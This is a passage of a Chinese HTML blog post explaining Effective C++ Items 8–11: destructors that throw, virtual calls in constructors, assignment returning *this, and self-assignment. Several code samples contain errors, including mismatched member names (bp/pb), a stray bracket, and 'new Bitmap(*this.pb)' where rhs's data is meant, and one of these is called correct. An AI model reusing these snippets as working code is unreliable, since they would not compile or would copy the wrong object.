punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">//函数f2调用了f1，所以抛出异常的类型也是整型</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f2 starts"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span>                      <span class="token comment">//这个变量也会在栈展开的过程中被释放资源</span>  <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">//f1没有搜索到对应的异常处理，因此返回到f2搜索</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f2 ends"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>      <span class="token comment">//这行代码也不会被执行</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f3 starts"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  try<span class="token punctuation">&#123;</span>                        <span class="token comment">//函数f3在try里调用f2，并可能会catch一个整型的异常</span>    <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token comment">//f2也没有找到异常处理，最后返回了f3并找到了异常处理</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"exception "</span><span class="token operator">&lt;&lt;</span>i<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f3 ends"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">f3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>在C++里，当有异常被抛出，调用栈(call stack)，即栈中用来储存函数调用信息的部分，会被按次序搜索，直到找到对应类型的处理程序(exception handler)。而这里的搜索顺序就是f1-&gt;f2-&gt;f3。f1没有对应类型的catch块，因此跳到了f2，但f2也没有对应类型的catch块，因此跳到f3才能处理掉这个异常。</p><p>以上这个寻找异常相应类型处理器的过程就叫做栈展开。同时在这一过程中，当从f1返回到f2时，f1里局部变量的资源会被清空，即调用了对象的析构函数。同样，在从f2返回到f3时，f2里局部变量也会被调用析构函数并清空资源。</p><p>C++并不阻止在类的析构函数中抛出异常，但这是一个非常不好的做法。因为栈展开的前提是已经有一个未处理的异常，并且栈展开会自动调用函数本地对象的析构函数，如果这时对象的析构函数时又抛出一个异常，现在就同时有两个异常出现，但C++最多只能同时处理一个异常，因此程序这时会自动调用std::terminate()函数，导致可以所谓的闪退或者崩溃。</p><p>如下栗子也会导致程序同时出现多个异常：<br><pre class="language-c" data-language="c"><code class="language-c">class Widget<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token operator">~</span><span class="token function">Widget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>        <span class="token comment">//假设此析构函数可能会抛出异常</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span>Widget<span class="token operator">></span> v<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>                         <span class="token comment">//在这一行调用了v的析构函数，资源被释放</span></code></pre><br>当v被调用析构函数，它包含的所有Widget对象也都会被调用析构函数。又因为v是一个容器，如果在释放第一个元素时触发了异常，它也只能继续释放别的元素，否则会导致其它元素的资源泄露。如果在释放第二个元素的时候又触发了异常，那么程序同样会导致崩溃。不仅仅是std::vector，所有STL容器的类甚至包括数组也都会像这样因为析构函数抛出异常而崩溃程序，所以在C++中，不要让析构函数抛出异常！</p><p>如果不得不抛出异常呢，如下：<br><pre class="language-c" data-language="c"><code class="language-c">class DBConnection<span class="token punctuation">&#123;</span>                   <span class="token comment">//某用来建立数据库连接的类</span>  public<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">static</span> DBConnection <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//建立一个连接</span>    <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">//关闭一个连接，假设可以抛出异常</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class DBConn<span class="token punctuation">&#123;</span>                         <span class="token comment">//创建一个资源管理类来提供更好的用户接口</span>  public<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token operator">~</span>DBConn<span class="token punctuation">&#123;</span> db<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">]</span>            <span class="token comment">//终止时自动调用关闭连接的方法</span>  private<span class="token operator">:</span>    DBConnection db<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span>                                   DBConn <span class="token function">dbc</span><span class="token punctuation">(</span>DBConnection<span class="token operator">::</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建一个DBConn类的对象</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                <span class="token punctuation">&#125;</span>      <span class="token comment">//对象dbc被释放资源</span><span class="token comment">//但它的析构函数调用了可能会抛出异常的close()方法</span></code></pre><br>可以通过DBConn的析构函数来释放资源并关闭连接，但析构函数所调用的close()方法可能会抛出异常，那么有什么方法来解决呢？<br>有三个方法：</p><ul><li><p>栈展开的过程终止于异常被对应类型的catch块接到，因此在这种情况下，只要catch包括了所有可能的异常，析构函数就能消化掉这个异常，防止异常从析构函数里跑出来，和别的异常产生冲突。</p><pre class="language-c" data-language="c"><code class="language-c">DBConn<span class="token operator">::</span><span class="token operator">~</span><span class="token function">DBConn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  try<span class="token punctuation">&#123;</span>     db<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//记录访问历史</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>通过std::abort()函数来主动关闭程序，而不是任由程序在某个随机时刻突然崩溃，这样能减少潜在的用户风险。对于某些比较严重的异常，就可以使用这个方法。并且可以结合使用上面的方法，把能处理的异常消化掉。</p><pre class="language-c" data-language="c"><code class="language-c">DBConn<span class="token operator">::</span><span class="token operator">~</span><span class="token function">DBConn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  try<span class="token punctuation">&#123;</span>     db<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//记录访问历史</span>    std<span class="token operator">::</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>把可能抛出异常的代码移出析构函数，设计DBConn类的更安全的接口，让其他函数来承担这个风险，而且这样也可以事先在析构函数这样的紧要关头前对异常做出处理。</p><pre class="language-c" data-language="c"><code class="language-c">class DBConn<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token operator">~</span><span class="token function">DBConn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//当要关闭连接时，手动调用此函数</span>  private<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    closed <span class="token operator">=</span> true<span class="token punctuation">;</span>       <span class="token comment">//显示连接是否被手动关闭</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> DBConn<span class="token operator">::</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//当需要关闭连接，手动调用此函数</span>  db<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  closed <span class="token operator">=</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>DBConn<span class="token operator">::</span><span class="token operator">~</span><span class="token function">DBcon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>closed<span class="token punctuation">)</span>            <span class="token comment">//析构函数虽然还是要留有备用，但不用每次都承担风险了</span>    try<span class="token punctuation">&#123;</span>      db<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token comment">//记录访问历史</span>      <span class="token comment">//消化异常或者主动关闭</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><p>总结：</p><ul><li>不要让异常从析构函数里跑出来。如果析构函数的某些代码可能会抛出异常，要保证它们能在跑出析构函数之前被catch块接到，然后选择消化异常还是终止程序。</li><li>可以把可能抛出异常的代码从析构函数中移到别的函数里，这样就可以事先对异常做出反应。</li></ul><h2 id="条款9-不要在构造函数和析构函数中调用虚函数"><a href="#条款9-不要在构造函数和析构函数中调用虚函数" class="headerlink" title="条款9 不要在构造函数和析构函数中调用虚函数"></a>条款9 不要在构造函数和析构函数中调用虚函数</h2><p>考虑如下情况<br><pre class="language-c" data-language="c"><code class="language-c">class Transaction<span class="token punctuation">&#123;</span>                              <span class="token comment">//股市交易的基类</span>  public<span class="token operator">:</span>    <span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    virtual <span class="token keyword">void</span> <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>     <span class="token comment">//该函数用来记录交易历史，是一个纯虚函数</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Transaction<span class="token operator">::</span><span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment">//在基类的构造函数中调用了这个纯虚函数</span><span class="token punctuation">&#125;</span></code></pre><br>同时又有表示”买进”和”卖出”的类，继承自以上的”交易”:<br><pre class="language-c" data-language="c"><code class="language-c">class BuyTransaction <span class="token operator">:</span> public Transaction<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    virtual <span class="token keyword">void</span> <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class SellTransaction <span class="token operator">:</span> public Transaction<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    virtual <span class="token keyword">void</span> <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>假设在某处定义一个“买进”类的对象：<br><pre class="language-c" data-language="c"><code class="language-c">BuyTransaction b<span class="token punctuation">;</span></code></pre><br>显然这里调用了”BuyTransaction”的构造函数。但因为在C++中，当子类开始构造时，它所包含的父类的部分要先完成构造，所以率先调用的构造函数是它的父类”Transaction”的构造函数。现在问题来了，因为父类的构造函数调用了一个纯虚函数，这就会导致即使创建的是它的子类对象，这个虚函数也不会绑定到子类的版本上，而是使用的父类版本。</p><p>这就”有悖常理”了，虚函数不是会自动绑定到继承层级里对应的一个类吗？其实C++这样做是有一个很好的原因的。在条款四中提到，使用未初始化的数据可能会给程序带来风险。因为在创建一个子类对象时，它的父类部分会先被创建。当父类的构造函数刚刚调用完成时，可以只能保证父类部分的数据被初始化，而不能保证衍生部分的被初始化。如果现在让这个虚函数去对应子类的版本，就可能会因为使用未初始化的数据而导致程序运行时错误。</p><p>事实上，正是由于这个原因，当一个子类对象在完成它自己全部成员的构造之前，C++只会把它当成父类，除了虚函数还包括typeid，dynamic_cast等，都会把当前对象当做父类，用来规避使用未初始化数据可能带来的风险。</p><p>同样的原理，也不要让析构函数调用虚函数。在条款7讲过，析构函数的调用顺序是从子类到父类，与构造函数的调用顺序是相反的。当子类部分的成员数据被删除时，C++同样会把当前的对象认为是父类，如果这时调用了虚函数，也会导致错误版本的虚函数被调用。</p><p>实际上这样在构造函数或者析构函数里直接调用虚函数，在某些编译器中是会发出警告的。不过即使无视掉这些警告，因为调用的是一个纯虚函数，通常是不会有定义的，所以在之后的链接过程中，链接器也会报错。</p><p>但如下的代码做了完全一样的事，编译器和链接器却都不会发出警告或报错。这样的代码相比前面的就更具有潜在危害性:<br><pre class="language-c" data-language="c"><code class="language-c">class Transaction<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>                  <span class="token comment">//调用了一个专门的init()函数</span>    virtual <span class="token keyword">void</span> logTransaction <span class="token keyword">const</span> <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                              <span class="token comment">//这个函数不是虚函数，而且有定义</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                     <span class="token comment">//编译器和链接器就都不会报错</span>      <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">//但里面却包含了虚函数的代码</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>即使init()函数有定义而且不是虚函数，它却调用了没有定义的纯虚函数logTransaction()，这就会导致在运行过程中，一旦使用了这里的代码，程序就会崩溃。</p><p>就算logTransaction()函数是一个有定义的”普通的”虚函数，即没有”=0”关键字来修饰，程序虽然不会因为缺少定义而闪退，但却一样会在子类的构造过程中调用错误版本的虚函数。所以万全的解决方法就是，不管是纯虚的还是普通的，就不要在构造或者析构函数中调用虚函数。</p><p>但如果一定想要对象在初始化的时候完成某些任务呢？那可以就需要在父类Transaction中，把虚函数logTransaction去掉virtual关键字，变成普通的函数，然后在子类构造过程中，把某些信息传递到父类的构造函数中。<br><pre class="language-c" data-language="c"><code class="language-c">class Transaction<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    explicit <span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//explicit关键字用来防止隐式转换</span>    <span class="token keyword">void</span> <span class="token function">logTransaction</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> info<span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span> <span class="token comment">//增加一个传递参数，就可以从子类获得信息了</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Transaction<span class="token operator">::</span><span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> info<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">logTransaction</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><br>现在就可以在子类对象中如下定义构造函数了，这样就能把子类的信息传递到父类中，让父类构造函数去完成子类构造函数想做的事：<br><pre class="language-c" data-language="c"><code class="language-c">class BuyTransaction <span class="token operator">:</span> public Transaction<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">BuyTransaction</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">Transaction</span><span class="token punctuation">(</span><span class="token function">createLog</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    <span class="token keyword">static</span> std<span class="token operator">::</span>string <span class="token function">createLog</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>这里createLog()就是一个辅助函数(helper function)，用来将某函数的一部分功能封装成另一个小函数，减少代码的复杂性，使代码更加可读。此外，因为这是一个子类的私有成员，父类构造函数被调用时不能保证它被初始化，所以使用static关键字可以避免意外使用了未初始化的成员数据。</p><p>总结：</p><ul><li>不要在构造函数或者析构函数中调用虚函数，因为这样的虚函数只会对应起来当前构造或析构的类，不会上升到它的任何子类。</li></ul><h2 id="条款10-赋值操作符返回-this的引用"><a href="#条款10-赋值操作符返回-this的引用" class="headerlink" title="条款10 赋值操作符返回*this的引用"></a>条款10 赋值操作符返回*this的引用</h2><p>c++中有如下用法：<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> x <span class="token punctuation">,</span> y <span class="token punctuation">,</span> z<span class="token punctuation">;</span>x <span class="token operator">=</span> y <span class="token operator">=</span> z <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span><span class="token comment">//上述代码会被编译器从最右开始解析</span>x <span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">=</span> <span class="token punctuation">(</span>z <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><br>对于自定义的类，赋值操作符应遵循如下两点规则:</p><ul><li>返回类型是当前类的引用</li><li>返回*this给左边的变量</li></ul><p>这个规则对+=, -=, *=等操作符同样适用。C++的自有类型，例如int, double，标准库的类型，例如std::string, std::complex，它们的赋值操作符都遵循这样的规则。</p><p>关于this，this是用来指向当前对象的指针，只存在于类的成员函数里，用来防止成员数据和成员函数参数的歧义:</p><pre class="language-c" data-language="c"><code class="language-c">class MessageBox<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">MessageBox</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    std<span class="token operator">::</span>string<span class="token operator">&amp;</span> message<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>MessageBox<span class="token operator">::</span><span class="token function">MessageBox</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string<span class="token operator">&amp;</span> message<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  this <span class="token operator">-></span> message <span class="token operator">=</span> message<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这里MessageBox类有一个数据成员叫message，同时它的构造函数也有一个参数叫message，此时为了避免歧义，可以用this-&gt;message来代表当前类的message成员。</p><p>总结：</p><ul><li>赋值操作符应返回一个指向*this的引用</li></ul><h2 id="条款11-在operator-中处理自我赋值（self-assingment）"><a href="#条款11-在operator-中处理自我赋值（self-assingment）" class="headerlink" title="条款11 在operator= 中处理自我赋值（self assingment）"></a>条款11 在operator= 中处理自我赋值（self assingment）</h2><p>自我赋值：<br><pre class="language-c" data-language="c"><code class="language-c">class Widget<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Widget w<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>w <span class="token operator">=</span> w<span class="token punctuation">;</span>             <span class="token comment">//自赋值</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment">//如果i==j,那么这行代码也构成自赋值</span><span class="token operator">*</span>px <span class="token operator">=</span> <span class="token operator">*</span>py<span class="token punctuation">;</span>         <span class="token comment">//如果px和py指向了同一个对象，这行代码也构成自赋值</span></code></pre><br>以上的情况都是别名(aliasing)的后果，即某个对象可以通过多于一个符号名被访问，比如上面px和py如果被声明为同一个类型，它们就可以同时可以指向同一个对象。但在一个继承层级中，即使两个对象被声明为了不同的类型，别名依然可能发生，因为基类指针或者引用可以指向任何一个它的子类，例如:</p><pre class="language-c" data-language="c"><code class="language-c">class Base<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Derived <span class="token operator">:</span> public Base<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>               <span class="token comment">//同一个继承层级中</span><span class="token keyword">void</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token keyword">const</span> Base<span class="token operator">&amp;</span> rb<span class="token punctuation">,</span> Derived<span class="token operator">*</span> pd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//rb与pd就可能指向同一个对象</span></code></pre><p>如果要手动管理资源而不使用资源管理类的话(resource managing class，见第13章)，的赋值操作符就可能不是自赋值安全的(self-assignment-safe):</p><p>考虑如下代码：<br><pre class="language-c" data-language="c"><code class="language-c">class Bitmap<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>class Widget<span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    Bitmap <span class="token operator">*</span>bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Widget<span class="token operator">&amp;</span> Widget<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  delete pb<span class="token punctuation">;</span>  pb <span class="token operator">=</span> new <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token operator">*</span>rhs<span class="token punctuation">.</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><br>如果传入的参数rhs本身，就会导致delete语句把*this自己的资源释放掉，同时也释放掉了rhs的资源，最后返回的*this包含了一个损坏的数据，不能访问不能修改，甚至不能通过delete来为其释放资源，等于说这段空间就凭空消失了，所以这段代码不是自赋值安全的。</p><p>解决方法：</p><ul><li>1 检查传入的参数是不是*this<pre class="language-c" data-language="c"><code class="language-c">Widget<span class="token operator">&amp;</span> Widget<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>this <span class="token operator">==</span> <span class="token operator">&amp;</span>rhs<span class="token punctuation">)</span>             <span class="token comment">//先做一个身份检测</span>    <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span>  delete pb<span class="token punctuation">;</span>                   <span class="token comment">//如果不是自己，再执行如下操作</span>  pb <span class="token operator">=</span> new <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token operator">*</span>this<span class="token punctuation">.</span>pb<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>但是这个方法有个问题，当执行完delete，执行new语句时抛出异常，会导致*this储存了一个损坏的数据。</li><li>2 重新排列语句<pre class="language-c" data-language="c"><code class="language-c">Widget<span class="token operator">&amp;</span> Widget<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  Bitmap <span class="token operator">*</span>pOrigin <span class="token operator">=</span> pb<span class="token punctuation">;</span>            <span class="token comment">//先保存一个原pb的备份</span>  pb <span class="token operator">=</span> new <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token operator">*</span>this<span class="token punctuation">.</span>pb<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//拷贝过来rhs的pb</span>  delete pOrigin<span class="token punctuation">;</span>                  <span class="token comment">//只删除备份</span>  <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>这条解决方法既对自赋值安全，对异常也是安全的。如果现在new的这行抛出了异常，指针pb也不会被提前删除。同时这样的语句排列省去了上一条解决方法身份检测的步骤，因为即使传入的rhs是*this本身，最后删除的也只是备份而不是*this自己的pb。</li><li>3 先拷贝再调换<pre class="language-c" data-language="c"><code class="language-c">class Widget<span class="token punctuation">&#123;</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span>Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//把rhs和*this的数据成员互相调换</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Widget<span class="token operator">&amp;</span> widget<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Widget<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  Widget <span class="token function">temp</span><span class="token punctuation">(</span>rhs<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//拷贝rhs</span>  <span class="token function">swap</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//将*this的数据与这个拷贝的数据调换</span>  <span class="token keyword">return</span> <span class="token operator">*</span>this<span class="token 